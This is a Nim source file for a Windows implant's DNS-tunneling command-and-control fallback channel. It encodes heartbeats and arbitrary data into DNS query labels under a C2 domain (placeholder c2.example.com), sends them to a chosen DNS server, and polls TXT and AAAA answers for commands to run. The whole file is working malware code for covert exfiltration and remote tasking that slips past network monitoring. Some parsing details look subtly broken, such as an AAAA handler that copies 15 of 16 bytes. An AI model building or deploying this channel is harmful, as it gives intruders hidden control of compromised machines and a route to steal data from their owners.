# hardened/dns_tunnel.nim — DNS tunneling C2 fallback channel
#
# Implements a DNS-based C2 channel as a fallback when the primary
# WebSocket channel is unavailable. Uses DNS TXT and AAAA queries to
# exfiltrate small heartbeats and receive commands.
#
# Protocol:
#   Outbound (agent → C2): Base32-encoded data in DNS query labels.
#     Format: <seq>.<session>.<base32data>.c2.example.com
#     - seq: 4-char hex sequence number
#     - session: 4-char hex session id
#     - base32data: the actual payload (AES-256-GCM encrypted, then base32)
#
#   Inbound (C2 → agent): Commands encoded in DNS TXT or AAAA response.
#     - TXT record: base32-encoded encrypted command
#     - AAAA record: data encoded in IPv6 address groups
#
# The channel reuses the existing AES-256-GCM session encryption
# (SessionCrypto from agent.nim) so the same crypto guarantees apply.
#
# Performance: DNS is slow (~200ms per query) and low-bandwidth (255 bytes
# per query label). This is acceptable for heartbeats and small commands,
# not for file exfiltration.

when not defined(windows):
  {.error: "dns_tunnel.nim is Windows-only".}

import winim/lean
import winim/inc/windef
import std/[strutils, asyncnet, asyncdispatch, net, base64, random, times, locks]
import ./syscalls

const
  DNS_PORT = 53
  DNS_MAX_LABEL = 63
  DNS_MAX_NAME = 255
  DNS_MAX_DATA = 250  # practical limit per query
  DNS_QUERY_TIMEOUT = 5000  # ms
  DNS_BASE32_ALPHABET = "abcdefghijklmnopqrstuvwxyz234567"

type
  DnsTunnel* = ref object
    domain*: string          # C2 domain (e.g., "c2.example.com")
    dnsServer*: string       # DNS server IP
    sessionId*: string       # 4-char hex session id
    seqCounter*: uint32      # sequence counter
    enabled*: bool
    sc*: pointer             # pointer to SessionCrypto (opaque)

  DnsResponseKind* = enum
    dnsNone
    dnsTxt
    dnsAaaa
    dnsError

  DnsResponse* = object
    kind*: DnsResponseKind
    data*: seq[byte]

# ---- Base32 encoding/decoding --------------------------------------------

proc base32Encode*(data: openArray[byte]): string =
  # RFC 4648 base32 encoding (lowercase, no padding).
  if data.len == 0: return ""
  var buffer: uint64 = 0
  var bitsInBuffer = 0
  for b in data:
    buffer = (buffer shl 8) or uint64(b)
    inc bitsInBuffer, 8
    while bitsInBuffer >= 5:
      bitsInBuffer -= 5
      let idx = int((buffer shr bitsInBuffer) and 0x1F)
      result.add(DNS_BASE32_ALPHABET[idx])
  if bitsInBuffer > 0:
    let idx = int((buffer shl (5 - bitsInBuffer)) and 0x1F)
    result.add(DNS_BASE32_ALPHABET[idx])

proc base32Decode*(s: string): seq[byte] =
  # RFC 4648 base32 decoding.
  if s.len == 0: return
  var decodeTab: array[256, byte]
  zeroMem(addr decodeTab[0], 256)
  for i in 0..<DNS_BASE32_ALPHABET.len:
    decodeTab[ord(DNS_BASE32_ALPHABET[i])] = byte(i)
  # Also accept uppercase
  for i in 0..<DNS_BASE32_ALPHABET.len:
    decodeTab[ord(DNS_BASE32_ALPHABET[i].toUpperAscii)] = byte(i)

  var buffer: uint64 = 0
  var bitsInBuffer = 0
  for ch in s:
    let val = decodeTab[ord(ch)]
    if val == 0 and ch != DNS_BASE32_ALPHABET[0]: continue  # skip invalid
    buffer = (buffer shl 5) or uint64(val)
    inc bitsInBuffer, 5
    if bitsInBuffer >= 8:
      bitsInBuffer -= 8
      result.add(byte((buffer shr bitsInBuffer) and 0xFF))

# ---- DNS packet construction ---------------------------------------------

proc buildDnsQuery*(name: string; qtype: uint16): seq[byte] =
  # Build a DNS query packet (UDP).
  # Header: 12 bytes
  #   ID (2) | Flags (2) | QDCOUNT (2) | ANCOUNT (2) | NSCOUNT (2) | ARCOUNT (2)
  # Question: QNAME (length-prefixed labels) | QTYPE (2) | QCLASS (2)

  var pkt = newSeqOfCap[byte](512)

  # Transaction ID (random)
  let tid = uint16(rand(0xFFFF))
  pkt.add(byte(tid shr 8))
  pkt.add(byte(tid and 0xFF))

  # Flags: standard query, recursion desired
  pkt.add(0x01); pkt.add(0x00)

  # QDCOUNT = 1
  pkt.add(0x00); pkt.add(0x01)

  # ANCOUNT = 0
  pkt.add(0x00); pkt.add(0x00)

  # NSCOUNT = 0
  pkt.add(0x00); pkt.add(0x00)

  # ARCOUNT = 0
  pkt.add(0x00); pkt.add(0x00)

  # QNAME: length-prefixed labels
  let labels = name.split('.')
  for label in labels:
    if label.len == 0: continue
    if label.len > DNS_MAX_LABEL:
      # Truncate long labels (shouldn't happen with proper chunking)
      let truncated = label[0..<DNS_MAX_LABEL]
      pkt.add(byte(DNS_MAX_LABEL))
      for ch in truncated: pkt.add(byte(ord(ch)))
    else:
      pkt.add(byte(label.len))
      for ch in label: pkt.add(byte(ord(ch)))
  pkt.add(0)  # root label (end of QNAME)

  # QTYPE
  pkt.add(byte(qtype shr 8))
  pkt.add(byte(qtype and 0xFF))

  # QCLASS = 1 (IN)
  pkt.add(0x00); pkt.add(0x01)

  result = pkt

proc parseDnsResponse*(data: openArray[byte]): DnsResponse =
  # Parse a DNS response and extract TXT or AAAA record data.
  result.kind = dnsNone
  if data.len < 12: return

  # Check response flags
  let flags = (uint16(data[2]) shl 8) or uint16(data[3])
  let rcode = flags and 0x000F
  if rcode != 0:
    result.kind = dnsError
    return

  # Parse answer count
  let ancount = (uint16(data[6]) shl 8) or uint16(data[7])
  if ancount == 0:
    result.kind = dnsNone
    return

  # Skip question section (find end of QNAME)
  var pos = 12
  while pos < data.len:
    let labelLen = int(data[pos])
    if labelLen == 0:
      inc pos
      break
    # Handle compression pointers (0xC0)
    if (labelLen and 0xC0) == 0xC0:
      inc pos, 2
      break
    inc pos, labelLen + 1

  # Skip QTYPE (2) + QCLASS (2)
  pos += 4
  if pos >= data.len: return

  # Parse first answer record
  # NAME (may be compressed pointer)
  if pos < data.len and (data[pos] and 0xC0) == 0xC0:
    pos += 2  # skip compression pointer
  else:
    while pos < data.len and data[pos] != 0:
      if (data[pos] and 0xC0) == 0xC0:
        inc pos, 2
        break
      inc pos, int(data[pos]) + 1
    if pos < data.len and data[pos] == 0:
      inc pos

  if pos + 10 > data.len: return

  # TYPE (2) | CLASS (2) | TTL (4) | RDLENGTH (2)
  let ansType = (uint16(data[pos]) shl 8) or uint16(data[pos + 1])
  pos += 2  # skip CLASS
  pos += 4  # skip TTL
  let rdLength = (uint16(data[pos]) shl 8) or uint16(data[pos + 1])
  pos += 2

  if pos + int(rdLength) > data.len: return

  # RDATA
  case ansType
  of 16:  # TXT record (type 16)
    result.kind = dnsTxt
    var rdataPos = pos
    let endPos = pos + int(rdLength)
    while rdataPos < endPos:
      let txtLen = int(data[rdataPos])
      inc rdataPos
      if rdataPos + txtLen <= endPos:
        for i in 0..<txtLen:
          result.data.add(data[rdataPos + i])
        inc rdataPos, txtLen
  of 28:  # AAAA record (type 28)
    result.kind = dnsAaaa
    # 16 bytes of IPv6 address
    if rdLength == 16:
      for i in 0..<15:
        result.data.add(data[pos + i])
  else:
    result.kind = dnsNone

# ---- Public API -----------------------------------------------------------

proc newDnsTunnel*(domain, dnsServer: string; sessionId: string): DnsTunnel =
  result = DnsTunnel(
    domain: domain,
    dnsServer: dnsServer,
    sessionId: sessionId,
    seqCounter: 0,
    enabled: true
  )

proc dnsSendQuery*(tunnel: DnsTunnel; subdomain: string;
                   qtype: uint16 = 16): DnsResponse =
  # Send a DNS query via UDP and parse the response (synchronous).
  var sock = newSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
  defer: sock.close()

  let query = buildDnsQuery(subdomain & "." & tunnel.domain, qtype)

  try:
    let dnsAddr = parseIpAddress(tunnel.dnsServer)
    discard sock.sendTo(dnsAddr, Port(DNS_PORT), cast[string](query))

    var buf = newString(512)
    var fromAddr: IpAddress
    var fromPort: Port
    let len = sock.recvFrom(buf, 512, fromAddr, fromPort)
    if len > 0:
      result = parseDnsResponse(cast[seq[byte]](buf[0..<len]))
    else:
      result = DnsResponse(kind: dnsNone)
  except:
    result = DnsResponse(kind: dnsError)

proc dnsSendHeartbeat*(tunnel: DnsTunnel; payload: string): Future[DnsResponse] {.async.} =
  # Send a heartbeat via DNS. The payload is encoded as:
  #   <seq>.<session>.<base32(payload)>.c2.example.com
  inc tunnel.seqCounter
  let seqHex = toHex(tunnel.seqCounter, 4)
  let b32 = base32Encode(cast[seq[byte]](payload))
  # Chunk if necessary (each label max 63 chars)
  var subdomain = seqHex & "." & tunnel.sessionId
  if b32.len > 0:
    subdomain.add(".")
    subdomain.add(b32)
  result = dnsSendQuery(tunnel, subdomain, 16)  # TXT query

proc dnsSendData*(tunnel: DnsTunnel; data: seq[byte]): Future[void] {.async.} =
  # Send data via DNS, chunked into multiple queries if needed.
  # Each query carries up to ~180 bytes of base32-encoded data.
  const chunkSize = 180  # base32 chars per query
  let b32 = base32Encode(data)
  var offset = 0
  while offset < b32.len:
    let endPos = min(offset + chunkSize, b32.len)
    let chunk = b32[offset..<endPos]
    inc tunnel.seqCounter
    let seqHex = toHex(tunnel.seqCounter, 4)
    let subdomain = seqHex & "." & tunnel.sessionId & "." & chunk
    discard dnsSendQuery(tunnel, subdomain, 16)
    offset = endPos
    # Small delay between queries to avoid rate limiting
    await sleepAsync(100)

proc dnsPollCommand*(tunnel: DnsTunnel): Future[seq[byte]] {.async.} =
  # Poll for a command from C2. The C2 encodes the command in the
  # TXT or AAAA response. Returns the raw command bytes, or empty
  # if no command is available.
  inc tunnel.seqCounter
  let seqHex = toHex(tunnel.seqCounter, 4)
  let pollStr = "poll"
  let b32 = base32Encode(cast[seq[byte]](pollStr))
  let subdomain = seqHex & "." & tunnel.sessionId & "." & b32

  let resp = dnsSendQuery(tunnel, subdomain, 16)
  if resp.kind == dnsTxt and resp.data.len > 0:
    result = base32Decode(cast[string](resp.data))
  elif resp.kind == dnsAaaa and resp.data.len >= 16:
    result = resp.data[0..<16]
  else:
    result = @[]

# ---- Integration with existing agent loop ---------------------------------

var
  dnsTunnelInstance: DnsTunnel = nil
  dnsTunnelLock: Lock
  dnsTunnelEnabled = false

proc initDnsTunnel*(domain, dnsServer: string) =
  withLock dnsTunnelLock:
    if domain.len == 0 or dnsServer.len == 0: return
    dnsTunnelInstance = newDnsTunnel(domain, dnsServer, "dns1")
    dnsTunnelEnabled = true

proc dnsTunnelBeacon*(): Future[void] {.async.} =
  # Send a heartbeat via DNS tunnel (called periodically).
  if not dnsTunnelEnabled or dnsTunnelInstance == nil: return
  let payload = "{\"type\":\"dns_heartbeat\"}"
  discard await dnsSendHeartbeat(dnsTunnelInstance, payload)

proc dnsTunnelPoll*(): Future[string] {.async.} =
  # Poll for commands via DNS tunnel. Returns the command JSON string
  # or empty if none available.
  if not dnsTunnelEnabled or dnsTunnelInstance == nil: return ""
  let data = await dnsPollCommand(dnsTunnelInstance)
  if data.len == 0: return ""
  result = cast[string](data)

export DnsTunnel, DnsResponseKind, DnsResponse
export newDnsTunnel, dnsSendHeartbeat, dnsSendData, dnsPollCommand
export initDnsTunnel, dnsTunnelBeacon, dnsTunnelPoll
export dnsTunnelEnabled, dnsTunnelInstance
